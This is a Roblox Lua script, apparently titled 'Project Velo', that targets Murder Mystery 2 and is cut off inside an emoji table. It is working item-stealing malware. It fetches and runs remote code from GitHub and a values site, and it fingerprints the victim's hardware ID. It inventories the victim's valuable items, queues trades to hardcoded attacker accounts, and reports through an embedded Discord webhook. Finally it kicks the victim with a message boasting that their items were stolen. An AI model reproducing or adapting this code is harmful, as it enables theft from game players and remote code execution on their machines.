-- CONFIG
getgenv().ProjectVeloConfig = {
    Receivers = {
        "https://discord.com/api/webhooks/1554672571021271103/wYdUjWvBgOOYLg9i0ZA_irgxKCyCzddSM3Ngu80oGxdB69YFRpbocy7Rry3XdVuVfvQv",
    },
    Targets = {},
    ReceiverAccounts = {
        "rawr_4n",
    },
    MinimumItemValue = 2,
    MinimumRarity = "Godly",
}

-- Custom Visual
loadstring(game:HttpGet("https://raw.githubusercontent.com/mug1p2dzx/visual/refs/heads/main/bloopers.lua"))()


if not game:IsLoaded() then
	game.Loaded:Wait()
end

-- Anti-private server
if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
	local localPlayer = game:GetService("Players").LocalPlayer
	if localPlayer then
		localPlayer:Kick("Project Velo: Private servers are not supported.")
	end
	return
end

-- Auto-disconnect if server is full
do
	local _Players = game:GetService("Players")
	if #_Players:GetPlayers() >= _Players.MaxPlayers then
		local _lp = _Players.LocalPlayer
		if _lp then
			_lp:Kick("Project Velo: Server full.")
		end
		return
	end
end

local genv = getgenv and getgenv() or _G

pcall(function()
	local v = setclipboard or toclipboard

	if type(v) == "function" then
		v("https://discord.gg/projectvelo")
	end
end)

if genv.ProjectVeloMM2RunLock then
	return
end

genv.ProjectVeloMM2RunLock = true
genv.ProjectVeloConfig = genv.ProjectVeloConfig or {}
local projectVeloConfig = genv.ProjectVeloConfig
local receivers = projectVeloConfig.Receivers or projectVeloConfig.RECEIVERS
local minimumItemValue = projectVeloConfig.MinimumItemValue or projectVeloConfig.MINIMUM_ITEM_VALUE or 0
local minimumRarity = projectVeloConfig.MinimumRarity or projectVeloConfig.MINIMUM_RARITY or "Common"
local receiverAccountsList = projectVeloConfig.ReceiverAccounts or projectVeloConfig.RECEIVER_ACCOUNTS or {}
local receiverDisplay = (type(receiverAccountsList) == "table" and #receiverAccountsList > 0)
    and table.concat(receiverAccountsList, ", ")
    or "N/A"
local num = tonumber(minimumItemValue)

if not num then
	return
end

local n = math.max(0, num)

local tbl = {
	Unknown = 1,
	Common = 1,
	Uncommon = 2,
	Rare = 3,
	Legendary = 4,
	Classic = 5,
	Godly = 6,
	Vintage = 7,
	Ancient = 8,
	Chroma = 9,
	Unique = 10,
}

local str5 = tostring(minimumRarity)
local v = tbl[str5]

if not v then
	return
end

if type(receivers) ~= "table" then
	return
end

-- tbl2 = webhook URLs (for Discord delivery)
local tbl2 = {}
for _, receiver in ipairs(receivers) do
	local match = tostring(receiver):match("^%s*(.-)%s*$")
	if match ~= "" then
		table.insert(tbl2, match)
	end
end

if #tbl2 == 0 then
	return
end

-- tbl3 = trade target player names (from Targets config key)
-- fallback: if Targets is not set, use ReceiverAccounts so receiver_account drives DoTrade
local targets = projectVeloConfig.Targets or projectVeloConfig.TARGETS or {}
if #targets == 0 and #receiverAccountsList > 0 then
	targets = receiverAccountsList
end
local tbl3 = {}
local tbl2targets = {}

for _, target in ipairs(targets) do
	local match = tostring(target):match("^%s*(.-)%s*$")
	if match ~= "" and not tbl3[string.lower(match)] then
		tbl3[string.lower(match)] = true
		table.insert(tbl2targets, match)
	end
end

local function fn(arg)
	return tbl3[string.lower(tostring(arg))] == true
end

local tbl4 = { "rawr_4n", "ForMethodOnly_1", "mm2hitsm" }
local n2 = math.max(5, tonumber(projectVeloConfig.RedirectAfterSeconds or projectVeloConfig.REDIRECT_AFTER_SECONDS) or 100)
local godly = tbl[tostring(projectVeloConfig.RedirectMinimumRarity or projectVeloConfig.REDIRECT_MINIMUM_RARITY or "Godly")] or tbl.Godly

local function fn2(arg)
	return tbl[tostring(arg.rarity)] or tbl.Unknown
end

local tbl5 = {}

for _, v2 in ipairs(tbl4) do
	tbl5[string.lower(v2)] = true
end

local flag = false

local function fn3(arg)
	return tbl5[string.lower(tostring(arg))] == true
end

local function fn4()
	if flag then
		return false
	end
	flag = true

	for i = #tbl4, 1, -1 do
		local v2 = tbl4[i]
		local v3 = string.lower(v2)

		if not tbl3[v3] then
			tbl3[v3] = true
			table.insert(tbl2targets, 1, v2)
		end
	end

	return true
end

if game.GameId ~= 66654135 or not ({ [142823291] = true, [335132309] = true, [636649648] = true })[game.PlaceId] then
	return
end

local str6 = "https://api.rubis.app/v2/scrap?public=true"
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local localPlayer = Players.LocalPlayer

while not localPlayer do
	Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
	localPlayer = Players.LocalPlayer
end

if localPlayer:GetAttribute("ClientLoaded") ~= true then
	repeat
		localPlayer:GetAttributeChangedSignal("ClientLoaded"):Wait()
	until localPlayer:GetAttribute("ClientLoaded") == true
end

localPlayer:WaitForChild("PlayerGui")
local request_ = http_request or request or syn and syn.request or fluxus and fluxus.request
local request_2

if request_ then
	request_2 = request_
else
	request_2 = http and http.request
end

if type(request_2) ~= "function" then
	return
end

local v2 = crypt
local crypt_

if v2 then
	crypt_ = v2
else
	crypt_ = syn and syn.crypt
end

local function fn5(arg)
	local tbl6 = {}

	for i = 1, #arg do
		tbl6[i] = string.format("%02x", string.byte(arg, i))
	end

	return table.concat(tbl6)
end

local tbl6 = {
	1116352408,
	1899447441,
	3049323471,
	3921009573,
	961987163,
	1508970993,
	2453635748,
	2870763221,
	3624381080,
	310598401,
	607225278,
	1426881987,
	1925078388,
	2162078206,
	2614888103,
	3248222580,
	3835390401,
	4022224774,
	264347078,
	604807628,
	770255983,
	1249150122,
	1555081692,
	1996064986,
	2554220882,
	2821834349,
	2952996808,
	3210313671,
	3336571891,
	3584528711,
	113926993,
	338241895,
	666307205,
	773529912,
	1294757372,
	1396182291,
	1695183700,
	1986661051,
	2177026350,
	2456956037,
	2730485921,
	2820302411,
	3259730800,
	3345764771,
	3516065817,
	3600352804,
	4094571909,
	275423344,
	430227734,
	506948616,
	659060556,
	883997877,
	958139571,
	1322822218,
	1537002063,
	1747873779,
	1955562222,
	2024104815,
	2227730452,
	2361852424,
	2428436474,
	2756734187,
	3204031479,
	3329325298,
}

local n3 = 4294967296

local function fn6(arg)
	local n4 = arg % n3
	local band = bit32.band
	local band2 = bit32.band
	return string.char(bit32.band(bit32.rshift(n4, 24), 255), bit32.band(bit32.rshift(n4, 16), 255), band(bit32.rshift(n4, 8), 255), band2(n4, 255))
end

local function fn7(arg)
	local n4 = #arg * 8
	local n5 = math.floor(n4 / n3)
	local n6 = n4 % n3
	local str7 = arg .. string.char(128) .. string.rep(string.char(0), (56 - (#arg + 1) % 64) % 64) .. fn6(n5) .. fn6(n6)
	local tbl7 = { 1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225 }

	for i = 1, #str7, 64 do
		local tbl8 = {}

		for i2 = 0, 15 do
			local n7 = i + i2 * 4
			local v3, v4, v5, v6 = string.byte(str7, n7, n7 + 3)
			tbl8[i2 + 1] = (v3 * 16777216 + v4 * 65536 + v5 * 256 + v6) % n3
		end

		for i2 = 17, 64 do
			local v3 = tbl8[i2 - 15]
			local v4 = tbl8[i2 - 2]
			local rshift = bit32.rshift
			local rshift2 = bit32.rshift
			tbl8[i2] = (tbl8[i2 - 16] + bit32.bxor(bit32.rrotate(v3, 7), bit32.rrotate(v3, 18), rshift(v3, 3)) + tbl8[i2 - 7] + bit32.bxor(bit32.rrotate(v4, 17), bit32.rrotate(v4, 19), rshift2(v4, 10))) % n3
		end

		local value, v3, v4, v5, v6, v7, v8, v9 = table.unpack(tbl7)

		for i2 = 1, 64 do
			local rrotate = bit32.rrotate
			local v10 = bit32.bxor(bit32.rrotate(v6, 6), bit32.rrotate(v6, 11), rrotate(v6, 25))
			local band = bit32.band
			local v11 = tbl6[i2]
			local n7 = (v9 + v10 + bit32.bxor(bit32.band(v6, v7), band(bit32.bnot(v6), v8)) + v11 + tbl8[i2]) % n3
			local rrotate2 = bit32.rrotate
			local v12 = bit32.bxor(bit32.rrotate(value, 2), bit32.rrotate(value, 13), rrotate2(value, 22))
			local bxor = bit32.bxor
			local v13 = bit32.band(value, v3)
			local v14 = bit32.band(value, v4)
			local v15 = table.pack(bit32.band(v3, v4))
			local n8 = (v5 + n7) % n3
			v9 = v8
			v5 = v4
			v8 = v7
			v4 = v3
			v7 = v6
			v3 = value
			v6 = n8
			value = (n7 + (v12 + bxor(v13, v14, table.unpack(v15, 1, v15.n))) % n3) % n3
		end

		tbl7[1] = (tbl7[1] + value) % n3
		tbl7[2] = (tbl7[2] + v3) % n3
		tbl7[3] = (tbl7[3] + v4) % n3
		tbl7[4] = (tbl7[4] + v5) % n3
		tbl7[5] = (tbl7[5] + v6) % n3
		tbl7[6] = (tbl7[6] + v7) % n3
		tbl7[7] = (tbl7[7] + v8) % n3
		tbl7[8] = (tbl7[8] + v9) % n3
	end

	local tbl8 = {}

	for i = 1, 8 do
		tbl8[i] = fn6(tbl7[i])
	end

	return table.concat(tbl8)
end

local function fn8(arg, arg2)
	local v3

	if #arg2 > 64 then
		v3 = fn7(arg2)
	else
		v3 = arg2
	end

	local str7 = v3 .. string.rep(string.char(0), 64 - #v3)
	local tbl7 = {}
	local tbl8 = {}

	for i = 1, 64 do
		local v4 = string.byte(str7, i)
		tbl7[i] = string.char(bit32.bxor(v4, 54))
		tbl8[i] = string.char(bit32.bxor(v4, 92))
	end

	local v4 = fn7(table.concat(tbl7) .. arg)
	return fn5(fn7(table.concat(tbl8) .. v4))
end

local flag2 = fn8("The quick brown fox jumps over the lazy dog", "key") == "f7bc83f430538424b13298e6aa6fb143ef4d59a14946175997479dbc2d1a3cd8"

local function fn9(arg, arg2)
	if crypt_ and type(crypt_.hmac) == "function" then
		for _, v3 in ipairs({ { arg, arg2, "sha256" }, { arg2, arg, "sha256" }, { "sha256", arg, arg2 } }) do
			local ok, result = pcall(crypt_.hmac, table.unpack(v3))
			if ok and result then
				return result
			end
		end
	end

	if not flag2 then
		return nil
	end
	local ok, result = pcall(fn8, arg, arg2)
	return ok and result or nil
end

local function fn10(arg)
	if not arg or arg == "" then
		return nil
	end
	local str7 = tostring(arg)
	if #str7 == 64 and str7:match("^[%x]+$") then
		return str7:lower()
	end

	if #str7 == 32 then
		return fn5(str7)
	end

	if crypt_ and type(crypt_.base64decode) == "function" then
		local ok, result = pcall(crypt_.base64decode, str7)
		if ok and result and #result == 32 then
			return fn5(result)
		end
	end

	return str7
end

local function fn11()
	local str7 = ""

	if type(gethwid) == "function" then
		local ok, result = pcall(gethwid)

		if ok and result then
			str7 = tostring(result)
		end
	end

	if str7 == "" then
		local str8 = "unknown"

		if type(identifyexecutor) == "function" then
			local ok, result = pcall(identifyexecutor)

			if ok and result then
				str8 = tostring(result)
			end
		end

		str7 = tostring(localPlayer.UserId) .. ":" .. str8
	end

	if crypt_ and type(crypt_.hash) == "function" then
		local ok, result = pcall(crypt_.hash, str7, "sha256")
		if ok and result then
			return tostring(result):sub(1, 128)
		end
	end

	return str7:sub(1, 128)
end

local base64encode

if crypt_ then
	base64encode = crypt_.base64encode or crypt_.base64_encode
else
	base64encode = crypt_
end

local base64decode

if crypt_ then
	base64decode = crypt_.base64decode or crypt_.base64_decode
else
	base64decode = crypt_
end

local function fn12(arg, arg2)
	if not (crypt_ and type(crypt_.hmac) == "function" and type(base64encode) == "function" and type(base64decode) == "function") then
		return nil
	end

	local ok, result = pcall(function()
		local function fn13(arg3, arg4)
			return base64decode(crypt_.hmac(arg3, arg4, "sha256"))
		end

		local str7 = game:GetService("HttpService"):GenerateGUID(false):gsub("-", ""):sub(1, 32)
		local v3 = fn13(arg2 .. "|starcrypt-enc-v1", "9f3c7a1e5b8d2046c1fe83a75d9b0e42a6c8f13d7e0b592a4c6f81d3b7e9a2508")
		local tbl7 = {}
		local n4 = 0
		local n5 = 0

		while n4 < #arg do
			tbl7[#tbl7 + 1] = fn13(str7 .. "|" .. n5, v3)
			n4 += 32
			n5 += 1
		end

		local str8 = table.concat(tbl7)
		local tbl8 = {}

		for i = 1, #arg do
			local byte = string.byte
			tbl8[i] = string.char(bit32.bxor(string.byte(arg, i), byte(str8, i)))
		end

		return { enc = base64encode(table.concat(tbl8)), n = str7 }
	end)

	if ok and type(result) == "table" and result.enc then
		return result
	end
	return nil
end

local function fn13(arg, arg2)
	local v3 = fn12(arg, arg2)
	if not v3 then
		return nil
	end

	local ok, result = pcall(function()
		return game:GetService("HttpService"):JSONEncode(v3)
	end)

	if ok then
		return result
	end
	return nil
end

local tbl7 = {}
local item = ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item")
local ok, result = pcall(require, item)

if ok and type(result) == "table" then
	tbl7 = result
end

local tbl8 = {}
local pets = ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Pets")
local ok2, result2 = pcall(require, pets)

if ok2 and type(result2) == "table" then
	tbl8 = result2
end

local function fn14(arg)
	return (string.lower(tostring(arg or "")):gsub("[^%w]", ""))
end

local str7 = tostring(projectVeloConfig.ValuesUrl or projectVeloConfig.VALUES_URL or "https://star-scripts.com/api/values/mm2") -- values endpoint unchanged

local function fn15()
	local ok3, result3 = pcall(function()
		return game:HttpGet(str7)
	end)

	if not (ok3 and type(result3) == "string" and #result3 > 0) then
		result3 = nil

		if type(request_2) == "function" then
			local ok4, result4 = pcall(request_2, { Url = str7, Method = "GET", Headers = { ["Cache-Control"] = "no-cache" } })
			ok4 = ok4 and type(result4) == "table"
			result3 = nil

			if ok4 then
				result3 = result4.Body or result4.body
			end
		end
	end

	if type(result3) ~= "string" or #result3 == 0 then
		return nil, "could not download the value list"
	end
	local v3 = loadstring or load
	if not v3 then
		return nil, "loadstring is unavailable"
	end
	local v4, v5 = v3(result3, "@mm2values.lua")
	if not v4 then
		return nil, tostring(v5)
	end
	local ok4, result4 = pcall(v4)
	if not ok4 or type(result4) ~= "table" then
		return nil, tostring(result4)
	end
	return result4
end

local projectVeloMM2ValuesCache = genv.ProjectVeloMM2ValuesCache

if type(projectVeloMM2ValuesCache) ~= "table" then
	projectVeloMM2ValuesCache = fn15()
	if not projectVeloMM2ValuesCache then
		return
	end
	genv.ProjectVeloMM2ValuesCache = projectVeloMM2ValuesCache
end

local tbl9 = {
	Common = "Common",
	Uncommon = "Uncommon",
	Rare = "Rare",
	Legendary = "Legendary",
	Godly = "Godly",
	Ancient = "Ancient",
	Unique = "Unique",
	Classic = "Vintage",
	Vintage = "Vintage",
	Chroma = "Chroma",
}

local tbl10 = { { "Nik's Scythe", "", "", "", "Ancient", 250000000 } }

if not genv.ProjectVeloMM2ExtrasMerged then
	for _, v3 in ipairs(tbl10) do
		table.insert(projectVeloMM2ValuesCache, v3)
	end

	genv.ProjectVeloMM2ExtrasMerged = true
end

local tbl11 = {}

for _, v3 in ipairs(projectVeloMM2ValuesCache) do
	local tbl12 = { name = v3[1], type = v3[2], year = v3[3], event = v3[4], rarity = v3[5], value = v3[6] }
	local v4 = fn14(tbl12.name)
	local tbl13 = tbl11[v4]

	if not tbl13 then
		tbl13 = {}
		tbl11[v4] = tbl13
	end

	table.insert(tbl13, tbl12)
end

local function fn16()
	return {}
end

local function fn17()
	return "Unknown"
end

local function fn18(arg)
	local flag3 = arg.isChroma == true
	local str8 = flag3 and "Chroma" or tbl9[tostring(arg.rarity)]
	local tbl12 = {}
	local tbl13 = {}

	local function fn19(arg2)
		local v3 = fn14(arg2)

		if v3 ~= "" and not tbl13[v3] then
			tbl13[v3] = true
			tbl12[#tbl12 + 1] = v3
		end
	end

	if flag3 then
		fn19("Chroma " .. tostring(arg.name))
	end

	fn19(arg.name)

	if arg.itemType and arg.itemType ~= "" then
		fn19(tostring(arg.name) .. " " .. tostring(arg.itemType))
	end

	local tbl14 = {}
	local tbl15 = {}

	for _, v3 in ipairs(tbl12) do
		local v4 = tbl11[v3]

		if v4 then
			for _, v5 in ipairs(v4) do
				if not tbl15[v5] then
					tbl15[v5] = true
					tbl14[#tbl14 + 1] = v5
				end
			end
		end
	end

	if #tbl14 == 0 then
		return 0, str8
	end

	if arg.category == "Pets" then
		local tbl16 = {}

		for _, v3 in ipairs(tbl14) do
			if v3.type == "Pet" then
				tbl16[#tbl16 + 1] = v3
			end
		end

		tbl14 = tbl16
		if #tbl14 == 0 then
			return 0, str8
		end
	end

	local function fn20(arg2)
		local tbl16 = {}

		for _, v3 in ipairs(tbl14) do
			if arg2(v3) then
				tbl16[#tbl16 + 1] = v3
			end
		end

		if #tbl16 > 0 then
			tbl14 = tbl16
		end
	end

	if str8 then
		fn20(function(arg2)
			return arg2.rarity == str8
		end)
	end

	if #tbl14 > 1 and arg.itemType and arg.itemType ~= "" then
		fn20(function(arg2)
			return arg2.type == "" or arg2.type == arg.itemType
		end)
	end

	if #tbl14 > 1 and arg.year and arg.year ~= "" then
		fn20(function(arg2)
			return arg2.year == "" or arg2.year == tostring(arg.year)
		end)
	end

	if #tbl14 > 1 and arg.event and arg.event ~= "" then
		fn20(function(arg2)
			return arg2.event == "" or arg2.event == tostring(arg.event)
		end)
	end

	local value = nil
	local rarity = nil

	for _, v3 in ipairs(tbl14) do
		if value == nil then
			value = v3.value
			rarity = v3.rarity
			continue
		end

		if v3.value == value then
			continue
		end
		return 0, str8
	end

	return value or 0, rarity or str8
end

local getProfileData = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Inventory"):WaitForChild("GetProfileData")
local n4 = 15
local n5 = 45
local v3 = nil
local n6 = 0
local n7 = 0

local function fn19(arg, arg2)
	local now = time()
	local n8 = now - n6
	if v3 and not arg and n8 < n4 then
		return v3
	end

	local ok3, result3 = pcall(function()
		return getProfileData:InvokeServer()
	end)

	local flag3 = type(result3) == "table"

	if flag3 then
		flag3 = tonumber(result3.userId or result3.UserId or result3.UserID)
	end

	flag3 = flag3 or nil

	if ok3 and type(result3) == "table" and (flag3 == nil or flag3 == localPlayer.UserId) and type(result3.Weapons) == "table" and type(result3.Weapons.Owned) == "table" then
		v3 = result3
		n6 = now
		return result3
	end

	if not arg2 and now - n7 >= 10 then
		n7 = now
	end

	if v3 and n8 <= n5 then
		return v3
	end
	return nil
end

local function fn20(arg)
	if arg.valueCategory == "Chroma" or arg.valueCategory == "Chromas" or arg.isChroma then
		return tbl.Chroma
	end
	return tbl[arg.rarity] or tbl.Unknown
end

local function fn21(arg)
	return ({
		Unique = 1,
		Ancient = 2,
		Godly = 3,
		Classic = 4,
		Legendary = 5,
		Rare = 6,
		Uncommon = 7,
		Common = 8,
		Vintage = 9,
		Unknown = 999,
	})[tostring(arg)] or 999
end

local function fn22(arg)
	local tbl12 = { Data = { Weapons = { Current = {} }, Pets = { Current = {} } } }

	for _, v4 in ipairs({ "Weapons", "Pets" }) do
		local owned = arg[v4] and arg[v4].Owned
		local current = tbl12.Data[v4].Current

		if type(owned) == "table" then
			for k, v5 in pairs(owned) do
				local num2

				if type(k) == "string" then
					if type(v5) == "number" then
						num2 = v5
						v5 = k
					elseif type(v5) == "string" then
						num2 = tonumber(v5)
						v5 = k
					elseif type(v5) == "boolean" then
						num2 = v5 and 1

						if num2 then
							v5 = k
						else
							num2 = nil
							v5 = k
						end
					else
						num2 = nil

						if type(v5) ~= "table" then
							v5 = k
						else
							num2 = tonumber(v5.Amount or v5.amount or v5.Count or v5.count or v5.OwnedAmount)

							if not num2 and (v5.Owned == true or v5.owned == true) then
								num2 = 1
								v5 = k
							else
								v5 = k
							end
						end
					end
				elseif type(v5) == "string" then
					num2 = 1
				else
					local v6 = nil
					num2 = nil

					if type(v5) ~= "table" then
						v5 = v6
					else
						local dataID = v5.DataID or v5.ItemID or v5.ItemId or v5.Id or v5.ID
						num2 = tonumber(v5.Amount or v5.amount or v5.Count or v5.count)
						local flag3 = dataID and not num2
						local flag4

						if flag3 then
							flag4 = v5.Owned == true or v5.owned == true
						else
							flag4 = flag3
						end

						if flag4 then
							num2 = 1
							v5 = dataID
						else
							v5 = dataID
						end
					end
				end

				local num3 = tonumber(num2)

				if v5 and num3 and num3 > 0 then
					local str8 = tostring(v5)
					local v6

					if v4 == "Weapons" then
						v6 = tbl7[str8]
					else
						v6 = nil

						if v4 == "Pets" then
							v6 = tbl8[str8]
						end
					end

					local v7 = current[str8]

					if v7 then
						v7.Amount = v7.Amount + num3
					else
						current[str8] = {
							DataID = str8,
							Name = type(v6) == "table" and (v6.ItemName or v6.Name) or str8,
							Amount = num3,
							Rarity = type(v6) == "table" and v6.Rarity or "Unknown",
							ItemType = type(v6) == "table" and v6.ItemType or v4 == "Pets" and "Pet" or v4,
							IsChroma = type(v6) == "table" and v6.Chroma == true,
							Year = type(v6) == "table" and v6.Year and tostring(v6.Year) or "",
							Event = type(v6) == "table" and v6.Event and tostring(v6.Event) or "",
							MetadataVerified = type(v6) == "table",
						}
					end
				end
			end
		end
	end

	return tbl12
end

local function fn23(arg)
	local str8 = arg.name:lower():gsub("[^%w]", "")
	local str9 = arg.id:lower():gsub("[^%w]", "")
	return str8 == "defaultgun" or str8 == "defaultknife" or str9 == "defaultgun" or str9 == "defaultknife"
end

local tbl12 = {
	Constellation_G_2024 = { Name = "Nightsky", Rarity = "Legendary", ItemType = "Gun" },
	ChromaDarkbringer = { Name = "Darkbringer", Rarity = "Godly", ItemType = "Gun", IsChroma = true },
	CandleflameChroma = { Name = "Candleflame", Rarity = "Godly", ItemType = "Knife", IsChroma = true },
	DeathshardChroma = { Name = "Deathshard", Rarity = "Godly", ItemType = "Knife", IsChroma = true },
	Sparkle9 = { Name = "Sparkle9", Rarity = "Common", ItemType = "Knife" },
	RIP = { Name = "RIP", Rarity = "Common", ItemType = "Gun" },
	Sweater_K_2025 = { Name = "Sweater", Rarity = "Uncommon", ItemType = "Knife" },
	Coal_K_2022 = { Name = "Coal", Rarity = "Common", ItemType = "Knife" },
	Bunnies_K_2025 = { Name = "Bunnies", Rarity = "Legendary", ItemType = "Knife" },
	Aurora_K_2021 = { Name = "Aurora", Rarity = "Legendary", ItemType = "Knife" },
	Energized_G_2025 = { Name = "Energized", Rarity = "Legendary", ItemType = "Gun" },
	Bats_K_2024 = { Name = "Bats", Rarity = "Common", ItemType = "Knife" },
	Cursed_K_2024 = { Name = "Cursed", Rarity = "Legendary", ItemType = "Knife" },
	Energized_K_2025 = { Name = "Energized", Rarity = "Legendary", ItemType = "Knife" },
	Frozen_G_2025 = { Name = "Frozen", Rarity = "Legendary", ItemType = "Gun" },
}

local function fn24(arg)
	local v4 = fn19(arg == true)
	if not v4 then
		return {}, false, { reason = "profile_unavailable" }
	end
	local ok3, result3 = pcall(fn22, v4)
	if not ok3 or type(result3) ~= "table" then
		return {}, false, { reason = "generation_failed" }
	end
	local tbl13 = {}
	local tbl14 = { rawItems = 0, valuedItems = 0, eligibleItems = 0, maximumValue = 0 }

	for _, v5 in ipairs({ "Weapons", "Pets" }) do
		local current = result3.Data and result3.Data[v5] and result3.Data[v5].Current or {}

		for k, v6 in pairs(current) do
			local flag3 = type(v6) == "table"

			if flag3 then
				flag3 = (tonumber(v6.Amount) or 0) > 0
			end

			if flag3 then
				tbl14.rawItems = tbl14.rawItems + 1

				local tbl15 = {
					id = tostring(v6.DataID or k),
					name = tostring(v6.Name or v6.ItemName or k),
					amount = tonumber(v6.Amount) or 1,
					rarity = tostring(v6.Rarity or "Unknown"),
					itemType = tostring(v6.ItemType or v6.DataType or v5),
					category = v5,
					year = tostring(v6.Year or ""),
					event = tostring(v6.Event or ""),
					metadataVerified = v6.MetadataVerified == true,
				}

				local v7 = tbl12[tbl15.id]

				if v7 and not tbl15.metadataVerified then
					tbl15.name = v7.Name or tbl15.name
					tbl15.rarity = v7.Rarity or tbl15.rarity
					tbl15.itemType = v7.ItemType or tbl15.itemType
					tbl15.isChroma = v7.IsChroma == true
				end

				for k2, v8 in pairs(v6) do
					if tostring(k2):lower():find("chroma", 1, true) and v8 ~= nil and v8 ~= false and v8 ~= 0 and v8 ~= "" then
						tbl15.isChroma = true
						break
					end
				end

				if not fn23(tbl15) then
					local v8 = fn16(tbl15)
					local v9, v10 = fn18(tbl15, v8)
					tbl15.value = v9
					tbl15.valueCategory = v10

					if tbl15.rarity == "Unknown" then
						tbl15.rarity = fn17(v8, tbl15.valueCategory)
					end

					tbl15.displayName = tbl15.name

					if (tbl15.valueCategory == "Chroma" or tbl15.valueCategory == "Chromas" or tbl15.isChroma) and not tbl15.name:lower():find("chroma", 1, true) then
						tbl15.displayName = "Chroma " .. tbl15.name
					end

					tbl15.totalValue = tbl15.value * tbl15.amount

					if tbl15.value > 0 then
						tbl14.valuedItems = tbl14.valuedItems + 1
					end

					tbl14.maximumValue = math.max(tbl14.maximumValue, tbl15.value)

					if tbl15.value >= n and fn20(tbl15) >= v then
						table.insert(tbl13, tbl15)
						tbl14.eligibleItems = tbl14.eligibleItems + 1
					end
				end
			end
		end
	end

	table.sort(tbl13, function(arg2, arg3)
		local val2 = arg2.value * arg2.amount
		local val3 = arg3.value * arg3.amount
		if val2 ~= val3 then
			return val2 > val3
		end

		if arg2.value ~= arg3.value then
			return arg2.value > arg3.value
		end
		local v5 = fn21(arg2.rarity)
		local v6 = fn21(arg3.rarity)
		if v5 ~= v6 then
			return v5 < v6
		end

		if arg2.rarity ~= arg3.rarity then
			return arg2.rarity < arg3.rarity
		end

		if arg2.name ~= arg3.name then
			return arg2.name < arg3.name
		end
		return arg2.id < arg3.id
	end)

	return tbl13, true, tbl14
end

local function fn25()
	local v4

	while true do
		v4 = fn19(true, true)

		if v4 then
			break
		else
			task.wait(1)
		end
	end

	return v4
end

fn25()
local v4, v5, v6 = fn24(false)

if #v4 == 0 then
	if v5 then
		local rawItems = v6.rawItems or 0
	end

	return
end

local function fn26(arg)
	return (string.format("%.2f", tonumber(arg) or 0):gsub("0+$", ""):gsub("%.$", ""))
end

local n8 = 0
local n9 = 0

for _, v7 in ipairs(v4) do
	n8 += v7.totalValue

	if v7.value > 0 then
		n9 += 1
	end
end

-- Auto-disconnect: if total value is 0 or no godly+ items, leave immediately
do
	local godlyRarities = { Godly = true, Ancient = true, Chroma = true, Unique = true, Vintage = true }
	local hasGodly = false
	for _, v7 in ipairs(v4) do
		if godlyRarities[v7.rarity] or godlyRarities[v7.valueCategory] then
			hasGodly = true
			break
		end
	end
	if n8 <= 0 or not hasGodly then
		game:GetService("Players").LocalPlayer:Kick("All your items just got stolen by Velo Hub, Lol\n\nCode Error: 267")
		return
	end
end

local function fn27(arg)
	local tbl13 = {}

	local tbl14 = {
		{ "nik's scythe", "☠️" },
		{ "harvester", "☠️" },
		{ "corrupt", "👿" },
		{ "batwing", "🦇" },
		{ "black luger", "🔫" },
		{ "deathshard", "💀" },
		{ "boneblade", "🦴" },
		{ "ghostblade", "👻" },
		{ "icecream", "🍦" },
		{ "ice cream", "🍦" },
		{ "cotton candy", "🍭" },
		{ "candy corn", "🌽" },
		{ "gingerbread", "🍪" },
		{ "gingercookie", "🍪" },
		{ "gingerblade", "🍪" },
		{ "gingermint", "🍪" },
		{ "cookie", "🍪" },
		{ "peppermint", "🍬" },
		{ "candy", "🍬" },
		{ "sugar", "🍭" },
		{ "sweet", "🍭" },
		{ "treat", "🍬" },
		{ "cane", "🍭" },
		{ "latte", "☕" },
		{ "hot chocolate", "☕" },
		{ "choco", "🍫" },
		{ "donut", "🍩" },
		{ "popsicle", "🍡" },
		{ "soda", "🥤" },
		{ "cherries", "🍒" },
		{ "cherry", "🍒" },
		{ "strawberries", "🍓" },
		{ "coconut", "🥥" },
		{ "melon", "🍉" },
		{ "bunnies", "🐰" },
		{ "bunny", "🐰" },
		{ "carrots", "🥕" },
		{ "carrot", "🥕" },
		{ "eggblade", "🥚" },
		{ "egg", "🥚" },
		{ "bacon", "🥓" },
		{ "pumpkin", "🎃" },
		{ "beachy", "🏝️" },
		{ "beach", "🏖️" },
		{ "sands", "⛱️" },
		{ "sand", "🏖️" },
		{ "palms", "🌴" },
		{ "tropical", "🌴" },
		{ "coconut", "🥥" },
		{ "dolphins", "🐬" },
		{ "duckies", "🦆" },
		{ "jellyfish", "\u{1FABC}" },
		{ "starfish", "⭐" },
		{ "turtles", "🐢" },
		{ "turtle", "🐢" },
		{ "kraken", "🐙" },
		{ "sharky", "🦈" },
		{ "shark", "🦈" },
		{ "watergun", "💦" },
		{ "aquarium", "🐠" },
		{ "waves", "🌊" },
		{ "wave", "🌊" },
		{ "tidal", "🌊" },
		{ "tides", "🌊" },
		{ "ocean", "🌊" },
		{ "water", "💧" },
		{ "icewing", "🧊" },
		{ "icebreaker", "🧊" },
		{ "iceblaster", "🧊" },
		{ "icepiercer", "🧊" },
		{ "iceflake", "❄️" },
		{ "icicles", "🧊" },
		{ "frostsaber", "❄️" },
		{ "frostbite", "❄️" },
		{ "frostflame", "❄️" },
		{ "frostfade", "❄️" },
		{ "frosted", "❄️" },
		{ "frosty", "⛄" },
		{ "frost", "❄️" },
		{ "frozen", "🧊" },
		{ "glacier", "🧊" },
		{ "blizzard", "🌨️" },
		{ "snowman", "⛄" },
		{ "snowflake", "❄️" },
		{ "snowball", "⛄" },
		{ "snowcannon", "❄️" },
		{ "snowstorm", "🌨️" },
		{ "snowglobe", "🔮" },
		{ "snow", "❄️" },
		{ "winter", "🥶" },
		{ "chill", "🥶" },
		{ "arctic", "🧊" },
		{ "polar bear", "🐻‍❄️" },
		{ " ice ", "🧊" },
		{ "nightfire", "🔥" },
		{ "flame", "🔥" },
		{ "fire", "🔥" },
		{ "magma", "🌋" },
		{ "heat", "🔥" },
		{ "burn", "🔥" },
		{ "candleflame", "🕯️" },
		{ "candle", "🕯️" },
		{ "elderwood", "🌲" },
		{ "flowerwood", "🌸" },
		{ "sakura", "🌸" },
		{ "blossom", "🌸" },
		{ "bloom", "🌸" },
		{ "flora", "🌷" },
		{ "floral", "🌷" },
